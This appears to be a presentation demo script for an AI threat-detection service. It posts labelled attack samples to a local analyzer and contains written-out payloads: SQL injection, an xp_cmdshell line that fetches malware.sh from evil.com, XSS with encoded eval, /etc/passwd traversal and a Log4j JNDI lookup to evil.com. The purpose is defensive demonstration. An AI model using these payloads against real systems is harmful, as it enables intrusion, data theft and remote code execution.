#!/bin/bash

# Kong Guard AI - Automated Demo Script for Presentations
# This script runs a choreographed sequence of attacks to showcase AI detection

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     Kong Guard AI - Automated Presentation Demo              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
AI_SERVICE="http://localhost:8000"
VISUALIZATION="http://localhost:8080"

# Function to send attack
send_attack() {
    local attack_type="$1"
    local description="$2"
    local method="$3"
    local path="$4"
    local query="$5"
    local body="$6"
    
    echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} ${YELLOW}Launching:${NC} $description"
    
    curl -s -X POST "$AI_SERVICE/analyze" \
        -H "Content-Type: application/json" \
        -d "{
            \"features\": {
                \"method\": \"$method\",
                \"path\": \"$path\",
                \"client_ip\": \"203.0.113.$((RANDOM % 255))\",
                \"user_agent\": \"DemoClient/1.0\",
                \"requests_per_minute\": $((RANDOM % 100 + 10)),
                \"content_length\": ${#body},
                \"query_param_count\": 1,
                \"header_count\": 5,
                \"hour_of_day\": $(date +%H),
                \"query\": \"$query\",
                \"body\": \"$body\"
            },
            \"context\": {
                \"previous_requests\": $((RANDOM % 50)),
                \"failed_attempts\": 0,
                \"anomaly_score\": 0.1
            }
        }" > /dev/null
    
    sleep 2
}

# Start presentation
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}Starting Automated Demo Sequence${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${BLUE}Open your browser to:${NC} ${MAGENTA}$VISUALIZATION${NC}"
echo ""
sleep 3

# Act 1: Normal Traffic
echo -e "\n${CYAN}Act 1: Normal API Traffic${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

for i in {1..3}; do
    send_attack "normal" "Normal user request #$i" \
        "GET" "/api/products" "category=electronics&page=$i" ""
done

# Act 2: SQL Injection Attempts
echo -e "\n${RED}Act 2: SQL Injection Attack${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

send_attack "sql" "Basic SQL injection" \
    "GET" "/api/users" "id=1 OR 1=1" ""

send_attack "sql" "Union-based SQL injection" \
    "GET" "/api/users" "id=1' UNION SELECT * FROM passwords--" ""

send_attack "sql" "Obfuscated SQL injection" \
    "GET" "/api/search" "q='; EXEC xp_cmdshell('wget evil.com/malware.sh')--" ""

# Act 3: XSS Attacks
echo -e "\n${RED}Act 3: Cross-Site Scripting (XSS)${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

send_attack "xss" "Simple XSS" \
    "POST" "/api/comment" "" '{"text":"<script>alert(1)</script>"}'

send_attack "xss" "Advanced XSS with encoding" \
    "POST" "/api/profile" "" '{"bio":"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"}'

# Act 4: Path Traversal
echo -e "\n${YELLOW}Act 4: Path Traversal Attack${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

send_attack "traversal" "Directory traversal" \
    "GET" "/api/file" "path=../../../../etc/passwd" ""

# Act 5: Zero-Day Simulation
echo -e "\n${MAGENTA}Act 5: Zero-Day Pattern (Unknown Attack)${NC}"
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

send_attack "zero-day" "Log4j-style attack" \
    "POST" "/api/log" "" '{"message":"${jndi:ldap://evil.com/a}"}'

send_attack "zero-day" "Complex business logic attack" \
    "POST" "/api/transfer" "" '{"from":"12345","to":"99999","amount":-1000000}'

# Act 6: DDoS Burst
echo -e "\n${RED}Act 6: DDoS Attack Simulation${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

echo "Sending rapid burst of 20 requests..."
for i in {1..20}; do
    curl -s -X POST "$AI_SERVICE/analyze" \
        -H "Content-Type: application/json" \
        -d "{
            \"features\": {
                \"method\": \"GET\",
                \"path\": \"/api/data\",
                \"client_ip\": \"203.0.113.100\",
                \"user_agent\": \"DDoSBot/1.0\",
                \"requests_per_minute\": 500,
                \"content_length\": 0,
                \"query_param_count\": 0,
                \"header_count\": 3,
                \"hour_of_day\": $(date +%H),
                \"query\": \"\",
                \"body\": \"\"
            },
            \"context\": {
                \"previous_requests\": $i,
                \"failed_attempts\": 0,
                \"anomaly_score\": 0.8
            }
        }" > /dev/null &
done
wait

sleep 3

# Act 7: Recovery - Normal Traffic
echo -e "\n${GREEN}Act 7: System Recovery - Normal Traffic Resumes${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

for i in {1..3}; do
    send_attack "normal" "Normal traffic restored #$i" \
        "GET" "/api/health" "check=true" ""
done

# Summary
echo -e "\n${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                    DEMO COMPLETE                           ${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo "Demo Highlights Demonstrated:"
echo -e "  ${GREEN}✓${NC} Real-time AI threat analysis"
echo -e "  ${GREEN}✓${NC} SQL injection detection"
echo -e "  ${GREEN}✓${NC} XSS attack prevention" 
echo -e "  ${GREEN}✓${NC} Path traversal blocking"
echo -e "  ${GREEN}✓${NC} Zero-day pattern recognition"
echo -e "  ${GREEN}✓${NC} DDoS attack mitigation"
echo -e "  ${GREEN}✓${NC} Intelligent threat scoring"
echo -e "  ${GREEN}✓${NC} Sub-100ms detection time"
echo ""
echo -e "${BLUE}Check the visualization dashboard for detailed insights!${NC}"